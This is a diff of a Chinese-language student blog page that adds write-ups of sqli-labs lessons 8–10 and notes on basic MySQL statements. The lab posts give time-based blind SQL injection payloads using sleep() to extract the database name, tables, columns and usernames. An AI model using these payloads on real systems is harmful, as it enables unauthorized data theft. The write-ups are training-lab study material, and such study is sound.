@@ -64,6 +64,188 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-blog j" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/13/blog%20j/" class="article-date">
+  <time datetime="2020-12-13T14:20:36.000Z" itemprop="datePublished">2020-12-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/13/blog%20j/">lesson9、lesson10</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="lesson9"><a href="#lesson9" class="headerlink" title="lesson9"></a>lesson9</h4><p>这题很有意思，我发现不管输入什么，返回值都是you are in，于是我查看源代码——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;	</span><br><span class="line">  	echo &#39;You are in...........&#39;;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">	echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;</span><br><span class="line">	echo &#39;You are in...........&#39;;</span><br><span class="line">	&#x2F;&#x2F;print_r(mysql_error());</span><br><span class="line">	&#x2F;&#x2F;echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;;	</span><br><span class="line">	echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到不论输入结果正确与否输出都为you are in</p>
+<p>通过题目我们知道注入点为 ’</p>
+<p>于是我觉得可以利用时间盲注，通过延时判断语句正确与否，于是输入爆库语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and If(substr(database(),1,1)&#x3D;&#39;e&#39;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>发现可行，那么剩下的内容和lesson8就一模一样了。</p>
+<h4 id="lesson10"><a href="#lesson10" class="headerlink" title="lesson10"></a>lesson10</h4><p>这题基于lesson9，但注入点有别于lesson9为 ‘’</p>
+<p>其余的也一样了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/12/13/blog%20j/" data-id="ckr0oba2v001hi8vu57eugmia" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-blog i" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/13/blog%20i/" class="article-date">
+  <time datetime="2020-12-13T07:23:18.000Z" itemprop="datePublished">2020-12-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/13/blog%20i/">lessen8</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="一-爆库"><a href="#一-爆库" class="headerlink" title="一.爆库"></a>一.爆库</h4><p>首先输入——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1--+</span><br></pre></td></tr></table></figure>
+
+<p>页面回显you are in</p>
+<p>接着打开源码查看到——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>则注入点为 ‘   ，输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; or 1&#x3D;1--+</span><br></pre></td></tr></table></figure>
+
+<p>回显正确。那么这时我觉得这和lesson5有什么区别呢？查看源代码发现——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+
+<p>他对mysql报错语句进行了注释，即这关不能用报错注入。</p>
+<p>于是我用布尔盲注，我发现不管我输入语句判断正确与否他返回的都是you are in那么说明我们想要使用布尔盲注也是不行的。那么最后尝试一下时间盲注，输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br><span class="line">或</span><br><span class="line">?id&#x3D;1&#39;and If(substr(database(),1,1)&#x3D;&#39;s&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<p>发现可以行得通，那么本题使用时间盲注无疑了。</p>
+<h4 id="二-爆表"><a href="#二-爆表" class="headerlink" title="二.爆表"></a>二.爆表</h4><p>输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1),1,1)&#x3D;&#39;e&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="三-爆列"><a href="#三-爆列" class="headerlink" title="三.爆列"></a>三.爆列</h4><p>输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select column_name from information_schema.columns where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;&#39;i&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="四-爆值"><a href="#四-爆值" class="headerlink" title="四.爆值"></a>四.爆值</h4><p>输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(substr((select username from users limit 0,1),1,1)&#x3D;&#39;D&#39;,1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/12/13/blog%20i/" data-id="ckr0oba2y001li8vufiwn7b0q" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-数据库的增删改查" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" class="article-date">
+  <time datetime="2020-12-07T08:25:42.000Z" itemprop="datePublished">2020-12-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/">mysql</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id><a href="#" class="headerlink" title></a></h2><h4 id="一-MySQL的增删改查语句。"><a href="#一-MySQL的增删改查语句。" class="headerlink" title="一.MySQL的增删改查语句。"></a>一.MySQL的增删改查语句。</h4><h5 id="1-增：有四种方法"><a href="#1-增：有四种方法" class="headerlink" title="1.增：有四种方法"></a>1.增：有四种方法</h5><p>a.使用insert插入单行数据；语法格式为insert into 表名（列名） values （’列值’）；</p>
+<p>例如：insert into lcj（姓名，班级，座号）values （‘小林’，‘网安一班’，‘30’）；</p>
+<p>b.insert 表名 set 列名=‘列值’，列名=‘列值’……..</p>
+<p>注：增加的列值是填充在新一行。</p>
+<h5 id="2-删："><a href="#2-删：" class="headerlink" title="2.删："></a>2.删：</h5><h6 id="a-使用delete删除数据；语法格式为delete-from-表名-；可在表名后面加where语句来充当条件语句。"><a href="#a-使用delete删除数据；语法格式为delete-from-表名-；可在表名后面加where语句来充当条件语句。" class="headerlink" title="a.使用delete删除数据；语法格式为delete from 表名 ；可在表名后面加where语句来充当条件语句。"></a>a.使用delete删除数据；语法格式为delete from 表名 ；可在表名后面加where语句来充当条件语句。</h6><h6 id="例如：delete-from-lcj-where-name-‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）"><a href="#例如：delete-from-lcj-where-name-‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）" class="headerlink" title="例如：delete from lcj where name=‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）"></a>例如：delete from lcj where name=‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）</h6><h5 id="3-改："><a href="#3-改：" class="headerlink" title="3.改："></a>3.改：</h5><h6 id="a-运用update对原1列值进行改动；语法update-表名-set-列名-更新值；例如：update-lcj-set-座号-1；可在更新值后面加where语句来充当条件语句；"><a href="#a-运用update对原1列值进行改动；语法update-表名-set-列名-更新值；例如：update-lcj-set-座号-1；可在更新值后面加where语句来充当条件语句；" class="headerlink" title="a.运用update对原1列值进行改动；语法update 表名 set 列名=更新值；例如：update lcj set 座号=1；可在更新值后面加where语句来充当条件语句；"></a>a.运用update对原1列值进行改动；语法update 表名 set 列名=更新值；例如：update lcj set 座号=1；可在更新值后面加where语句来充当条件语句；</h6><h5 id="4-查："><a href="#4-查：" class="headerlink" title="4.查："></a>4.查：</h5><h6 id="a-查表中的所有数据：select-from-表名；"><a href="#a-查表中的所有数据：select-from-表名；" class="headerlink" title="a.查表中的所有数据：select *from 表名；"></a>a.查表中的所有数据：select *from 表名；</h6><p>b.</p>
+<h4 id="二-MySQL语句使用练习。"><a href="#二-MySQL语句使用练习。" class="headerlink" title="二.MySQL语句使用练习。"></a>二.MySQL语句使用练习。</h4><p>1.建立数据库：create database class character set gbk;   其中class为数据库名。</p>
+<p>2.使用数据库：use class；</p>
+<p>3.创建表：create table a（列名 数据类型）；其中a为表名。 如：{   create table class(name varchar(20));    }</p>
+<p>4.查看表数据（值）：select *form a；</p>
+<p>5.查看表结构：desc a；</p>
+<h4 id="三-特殊的"><a href="#三-特殊的" class="headerlink" title="三.特殊的"></a>三.特殊的</h4><p>增加列：alter table 表名 add 列名 列值类型 约束；</p>
+<p>将旧表的内容复制到新表：insert into less42 select *from users</p>
+<p>附：MySQL增删改查语句学习资料<a target="_blank" rel="noopener" href="https://www.iteye.com/blog/sakyone-365147">https://www.iteye.com/blog/sakyone-365147</a></p>
+<h5 id="四-数据库alter的用法："><a href="#四-数据库alter的用法：" class="headerlink" title="四.数据库alter的用法："></a>四.数据库alter的用法：</h5><p>1：删除列</p>
+<p>ALTER TABLE 【表名】 DROP 【列名】</p>
+<p>2：增加列</p>
+<p>ALTER TABLE 【表名】 ADD 【列名】 【类型】<br>alter table table1 add transactor varchar(10) not Null;</p>
+<p>3：重命名列</p>
+<p>ALTER TABLE 【表名】 CHANGE 【列名】【新名】 </p>
+<p>4：修改表字段</p>
+<p>alter table 表名称 change 字段名称 字段新名称 字段新类型 [是否允许非空];<br>alter table 表名称 modify 字段名称 字段新类型 [是否允许非空];</p>
+<p>5：查询表的字段信息</p>
+<p>desc 表名称;</p>
+<p>6：创建索引</p>
+<p>ALTER TABLE tbl_name ADD INDEX index_name (column list);</p>
+<p>7：删除索引</p>
+<p>ALTER TABLE tbl_name DROP INDEX index_name (column list);</p>
+<p>8：修改表名</p>
+<p>ALTER TABLE 表名 rename 新表名;</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/sinat_36053757/article/details/83380684">https://blog.csdn.net/sinat_36053757/article/details/83380684</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" data-id="ckr0oba3o003xi8vu4yh9fpmm" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-blog g" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/29/blog%20g/" class="article-date">
@@ -451,42 +633,11 @@
 
 
   
-    <article id="post-blog1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/01/blog1/" class="article-date">
-  <time datetime="2020-10-01T13:32:41.724Z" itemprop="datePublished">2020-10-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <hr>
-<p>title: “搭建的博客”<br>date: 2020-10-01 21:32:41<br>tags:<br>description:<br>1.用git bash进行hexo init指令时一定要认清楚文件夹，是对hexo文件夹进行格式化，我刚刚开始做的时候对blog文件夹一直做格式化导致耗费了很久时间<br>2.在复制个人github地址后粘贴在congig时可能会混杂许多空格，这些空格会影响你执行hexo d指令，也就是说无法将本地文件部署到个人网页上</p>
-<p>3.生产新博客：hexo new blogx</p>
-<p>4.写blog的时候要使用编码UTF-8,否则传输到hexo网页上会显示乱码</p>
-<p>5.用hexo g；hexo d指令上传博客时要在**<u>hexo文件</u>**下建立的hexo bash中输入。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/01/blog1/" data-id="ckr0oba2z001oi8vu6unxdr17" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
+    <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -532,23 +683,23 @@
       <ul>
         
           <li>
+            <a href="/2021/07/15/buuctf7/">buuctf7</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/14/buuctf6/">buuctf6</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/">攻防世界web进阶</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/12/bugku3/">bugku3</a>
           </li>
         
           <li>
             <a href="/2021/07/11/buuctf5/">buuctf5</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/06/CTF%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/">CTF工具用法</a>
-          </li>
-        
-          <li>
-            <a href="/2021/05/23/buuctf4/">buuctf4</a>
-          </li>
-        
-          <li>
-            <a href="/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">序列化与反序列化</a>
           </li>
         
       </ul>
